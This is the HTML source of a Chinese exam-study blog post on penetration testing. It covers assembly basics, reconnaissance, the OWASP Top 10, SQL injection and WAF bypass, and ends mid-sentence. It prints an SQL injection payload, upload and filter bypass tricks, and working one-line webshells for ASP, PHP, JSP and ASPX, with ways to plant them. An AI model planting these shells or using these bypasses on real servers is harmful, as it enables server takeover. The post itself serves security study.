&lt;li&gt;
&lt;p&gt;ROPgadget --binary file&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ROP chain (将多个 gadget 组合到一起连续调用多个函数)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;真题解析之逆向知识及题目讲解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#真题解析之逆向知识及题目讲解&#34;&gt;#&lt;/a&gt; 真题解析之逆向知识及题目讲解&lt;/h1&gt;
&lt;h2 id=&#34;汇编基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#汇编基础&#34;&gt;#&lt;/a&gt; 汇编基础&lt;/h2&gt;
&lt;h3 id=&#34;栈的概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#栈的概念&#34;&gt;#&lt;/a&gt; 栈的概念&lt;/h3&gt;
&lt;h3 id=&#34;寄存器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#寄存器&#34;&gt;#&lt;/a&gt; 寄存器&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通用寄存器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;8 位 AL AH BL BH&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;16 位 AX BX CX DX&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;32 位 EAX EBX ECX EDX&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;64 位 RAX RBX RCX RDX&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;指令指针寄存器：IP (指向下一条要取指的指令地址)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基址寄存器：BP 栈底&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;堆栈寄存器：SP 栈顶&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指令&#34;&gt;#&lt;/a&gt; 指令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;MOV：数据传送指令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CALL：1. 把当前的 IP 压入栈中，2、跳转到指定位置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RET：用栈中所保存的数据赋值给 IP, 跳转回来&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PUSH：先减 ESP, 再把数据放进去&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;POP：先把数据 POP 出，再加 ESP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LEAVE：MOV SP，BP ; POP BP&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;跳转指令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.15_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;EFLAG 寄存器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.15_2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IDA shift+F7 查看 elf 的段 (.init .init_array (存放函数执行前的要执行的函数指针))&lt;/p&gt;
&lt;h1 id=&#34;31-信息搜集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#31-信息搜集&#34;&gt;#&lt;/a&gt; 3.1 信息搜集&lt;/h1&gt;
&lt;h2 id=&#34;服务器类型-平台-版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务器类型-平台-版本&#34;&gt;#&lt;/a&gt; 服务器类型、平台、版本&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;nmap&lt;/p&gt;
&lt;p&gt;nmap 进行扫描，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -O 目标ip&lt;/code&gt;  探测系统类型&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -sV 目标ip&lt;/code&gt;  探测服务类型&lt;/p&gt;
&lt;p&gt;-sT -sU 等&lt;/p&gt;
&lt;p&gt;状态： state open 开放，closed 关闭，filtered 被防火墙 \IDS\IPS 等屏蔽、无法确定的状态，unfiltered 没有被屏蔽&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;owasp ZAP&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;网站容器-iis-apache-nginx-tomcat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网站容器-iis-apache-nginx-tomcat&#34;&gt;#&lt;/a&gt; 网站容器 --IIS、Apache、nginx、tomcat&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;whatweb&lt;/li&gt;
&lt;li&gt;nmap&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;脚本类型-jsp-php-asp-aspx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#脚本类型-jsp-php-asp-aspx&#34;&gt;#&lt;/a&gt; 脚本类型 --jsp、php、asp、aspx&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;根据页面&lt;/li&gt;
&lt;li&gt;dirbuster&lt;/li&gt;
&lt;li&gt;site:ip filetype:?php|jsp|asp&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;数据库类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库类型&#34;&gt;#&lt;/a&gt; 数据库类型&lt;/h2&gt;
&lt;p&gt;常见搭配：php--mysql、postgresql；asp 和 aspx--access、sqlserver；jsp--mysql、oracle&lt;/p&gt;
&lt;h2 id=&#34;cms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cms&#34;&gt;#&lt;/a&gt; CMS&lt;/h2&gt;
&lt;p&gt;常见 CMS： 织梦（Dedecms）\Dizcuz\phpweb\phpcms\ 帝国 \ASPCMS\WORDPRESS&lt;/p&gt;
&lt;p&gt;工具：御剑 web 指纹识别、whatweb、椰树等&lt;/p&gt;
&lt;h2 id=&#34;waf-安全狗-安全狗的设置方式-找到绕过的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-安全狗-安全狗的设置方式-找到绕过的方法&#34;&gt;#&lt;/a&gt; waf 安全狗、安全狗的设置方式、找到绕过的方法&lt;/h2&gt;
&lt;h2 id=&#34;网站目录后台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网站目录后台&#34;&gt;#&lt;/a&gt; 网站目录后台&lt;/h2&gt;
&lt;p&gt;后台扫描&lt;/p&gt;
&lt;h2 id=&#34;敏感信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#敏感信息&#34;&gt;#&lt;/a&gt; 敏感信息&lt;/h2&gt;
&lt;p&gt;后台目录、安装包、上传目录、网站根目录、数据库管理接口、安全页面（install.php 二次安装绕过）、phpinfo、robots.txt&lt;/p&gt;
&lt;h2 id=&#34;旁站和-c-站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#旁站和-c-站&#34;&gt;#&lt;/a&gt; 旁站和 c 站&lt;/h2&gt;
&lt;p&gt;主站难攻击，可先去旁站找漏洞，拿到控制权&lt;/p&gt;
&lt;p&gt;namp&lt;/p&gt;
&lt;h2 id=&#34;漏洞挖掘&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞挖掘&#34;&gt;#&lt;/a&gt; 漏洞挖掘&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;系统主机：Nessus&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;web 漏洞：AVWS\Burp、OWASP ZAP\WPSCAN\APPSCAN&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;常见的端口号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的端口号&#34;&gt;#&lt;/a&gt; 常见的端口号&lt;/h2&gt;
&lt;p&gt;21/22/69/139 文件共享端口&lt;/p&gt;
&lt;p&gt;22/23/3389 远程端口&lt;/p&gt;
&lt;p&gt;80/443/8080&lt;/p&gt;
&lt;p&gt;7001/7002 weblogic&lt;/p&gt;
&lt;p&gt;3306 mysql&lt;/p&gt;
&lt;p&gt;1443 mssql&lt;/p&gt;
&lt;p&gt;1521 oracle&lt;/p&gt;
&lt;p&gt;6379 redis&lt;/p&gt;
&lt;h1 id=&#34;33-web-应用安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#33-web-应用安全&#34;&gt;#&lt;/a&gt; 3.3 web 应用安全&lt;/h1&gt;
&lt;h2 id=&#34;owasp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#owasp&#34;&gt;#&lt;/a&gt; owasp&lt;/h2&gt;
&lt;h2 id=&#34;owasp-top10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#owasp-top10&#34;&gt;#&lt;/a&gt; owasp top10&lt;/h2&gt;
&lt;h3 id=&#34;sql-注入漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入漏洞&#34;&gt;#&lt;/a&gt; sql 注入漏洞&lt;/h3&gt;
&lt;h4 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h4&gt;
&lt;h4 id=&#34;流程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#流程-2&#34;&gt;#&lt;/a&gt; 流程&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;注入点探测&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;自动探测：web 漏扫工具，AWVS、APPSCAN、openVAS、nessus、OWASP ZAP、Burpsuit&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;手工方式：手工构造 payload&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信息获取&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;环境信息：数据库的类型、版本、操作系统版本、用户信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库的信息：库名、表名、字段名、数据值（管理员账户密码）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取权限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取操作系统权限：执行 shell、上传大马或小马&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h4&gt;
&lt;p&gt;sqlmap&lt;/p&gt;
&lt;p&gt;整型、字符型&lt;/p&gt;
&lt;p&gt;搜索型&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%$pwd%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当此时输入的 &lt;code&gt;$pwd&lt;/code&gt;  为  &lt;code&gt;&#39; or 1=1 and &#39;%&#39;=&#39;&lt;/code&gt;  时，原语句变为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时由于 and 的优先级最高，那么会判断其前后两条语句，即&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;很明显为真，故绕过&lt;/p&gt;
&lt;h3 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h3&gt;
&lt;h3 id=&#34;上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传漏洞&#34;&gt;#&lt;/a&gt; 上传漏洞&lt;/h3&gt;
&lt;h4 id=&#34;上传绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传绕过&#34;&gt;#&lt;/a&gt; 上传绕过&lt;/h4&gt;
&lt;p&gt;客户端：js 检查&lt;/p&gt;
&lt;p&gt;服务端：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;检查后缀&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;黑名单：可解析的后缀.php、.xxx，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传伪静态.htaccess 点绕过 空格绕过 &#39;::$DATA 绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;白名单：%00 截断、0x00 截断、MIME 绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查内容&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;文件头&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;突破 getimagesize ()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二次渲染&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码逻辑&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;条件竞争&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;csrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h3&gt;
&lt;h3 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h3&gt;
&lt;p&gt;服务器端请求伪造，通过漏洞访问内网获取信息&lt;/p&gt;
&lt;h3 id=&#34;暴力破解漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#暴力破解漏洞&#34;&gt;#&lt;/a&gt; 暴力破解漏洞&lt;/h3&gt;
&lt;p&gt;Hydra - 九头蛇（ftp、ssh、telent、mysql 等）&lt;/p&gt;
&lt;h3 id=&#34;文件包含漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含漏洞&#34;&gt;#&lt;/a&gt; 文件包含漏洞&lt;/h3&gt;
&lt;h3 id=&#34;xxe-漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe-漏洞&#34;&gt;#&lt;/a&gt; XXE 漏洞&lt;/h3&gt;
&lt;h3 id=&#34;反序列化漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化漏洞&#34;&gt;#&lt;/a&gt; 反序列化漏洞&lt;/h3&gt;
&lt;h1 id=&#34;34-sql-注入及-waf-绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#34-sql-注入及-waf-绕过&#34;&gt;#&lt;/a&gt; 3.4 sql 注入及 waf 绕过&lt;/h1&gt;
&lt;h2 id=&#34;waf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf&#34;&gt;#&lt;/a&gt; waf&lt;/h2&gt;
&lt;p&gt;WAF（Web Application Firework）web 应用防火墙&lt;/p&gt;
&lt;h3 id=&#34;类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#类型&#34;&gt;#&lt;/a&gt; 类型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;软件型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;硬件型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;云 WAF 反向代理工作，通过配置 NS 记录或者 CNAME 记录，带有防护的 CDN&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网站系统内置的 WAF（代码之类的）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#功能&#34;&gt;#&lt;/a&gt; 功能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;审计&lt;/li&gt;
&lt;li&gt;访问控制 / 过滤&lt;/li&gt;
&lt;li&gt;web 加固&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;waf-怎么识别扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-怎么识别扫描器&#34;&gt;#&lt;/a&gt; WAF 怎么识别扫描器&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;AWVS、SQLMAP、APPscan、OpenVAS 等工具（基于白盒 / 灰盒渗透测试）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;以下几点来识别 WAF：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;扫描器指纹（head 字段 / 请求的参数值）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单 IP+cookie 某一时间段触发多少次来判断&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;隐藏连接标签&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如何判断目标是否有 WAF&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sqlmap -u url --identity-waf --batch&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;手工判断&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;写一个注入到一个不存在的参数，用来触发 WAF&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;触发：形式变现：页面无法访问、响应码异常、返回与页面不符&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sql-注入绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入绕过&#34;&gt;#&lt;/a&gt; SQL 注入绕过&lt;/h2&gt;
&lt;p&gt;黑名单过滤：空格、\、/、&#39;、and、or、union、select、sleep ()、&#34;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;双写绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编码绕过（base64、url、ascii、宽字符、Unicode）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;替换关键字&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注释绕过（内联注释 /**/ ）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;等等等&lt;/p&gt;
&lt;h1 id=&#34;35-webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#35-webshell&#34;&gt;#&lt;/a&gt; 3.5 webshell&lt;/h1&gt;
&lt;h2 id=&#34;概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念&#34;&gt;#&lt;/a&gt; 概念&lt;/h2&gt;
&lt;p&gt;web + shell&lt;/p&gt;
&lt;p&gt;web：web 服务器上&lt;/p&gt;
&lt;p&gt;shell：用脚本语言编写的脚本程序&lt;/p&gt;
&lt;p&gt;webshell 用来进行网站和服务器管理的脚本程序&lt;/p&gt;
&lt;h2 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;大马：体积大、功能全、会调用系统相关的函数、代码通过加密的方式隐藏&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;小马：体积小、功能小、如只有上传功能&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一句话木马 / 混淆一句话：代码短、只有一行、安全性高、隐蔽性强、可变形免杀&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;编写方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写方法&#34;&gt;#&lt;/a&gt; 编写方法&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;asp： &lt;code&gt;&amp;lt;%execute(request(&#34;value&#34;))%&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php： &lt;code&gt;&amp;lt;?php eval($_POST[1]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;jsp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-jsp&#34;&gt;&amp;lt;%Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;));%&amp;gt;

&amp;lt;%
if(request.getParameter(&#34;f&#34;)!=null)(new java.io.FileOutputStream(application.getRealPath(&#34;\\&#34;)+request.getParameter(&#34;f&#34;))).write(request.getParameter(&#34;t&#34;).getBytes());
%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;aspx:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asp&#34;&gt;&amp;lt;%@ Page Language=&#34;Jscript&#34;%&amp;gt;
&amp;lt;%eval(Request.Item[&#34;value&#34;])%&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;直接通过上传 webshell 到服务器的 web 目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;找到数据库是.asp、.php、.jsp 格式的网站，然后留言板、论坛文章发表的方式、把一句话木马添加到数据库中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把一句话木马插入到网站的动态页面，然后直接通过客户端（蚁剑、菜刀...）连接网页&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;上传攻击原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传攻击原理&#34;&gt;#&lt;/a&gt; 上传攻击原理&lt;/h2&gt;
&lt;p&gt;利用函数，控制参数，执行任意语句，执行命令&lt;/p&gt;
&lt;h2 id=&#34;上传绕过方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传绕过方法&#34;&gt;#&lt;/a&gt; 上传绕过方法&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;js 绕过：抓包修改、禁用 js&lt;/li&gt;
&lt;li&gt;%00 绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;36-webshell-提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#36-webshell-提权&#34;&gt;#&lt;/a&gt; 3.6 webshell 提权&lt;/h1&gt;
&lt;h2 id=&#34;获取-webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取-webshell&#34;&gt;#&lt;/a&gt; 获取 webshell&lt;/h2&gt;
&lt;h3 id=&#34;phpmyadmin-提权写文件写一句话木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpmyadmin-提权写文件写一句话木马&#34;&gt;#&lt;/a&gt; phpmyadmin 提权写文件，写一句话木马&lt;/h3&gt;
&lt;h3 id=&#34;日志写入一句话&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志写入一句话&#34;&gt;#&lt;/a&gt; 日志写入一句话&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;首先要开启日志记录&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; VARIABLES &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%general%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#查看是否开启&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;如果返回&lt;/p&gt;
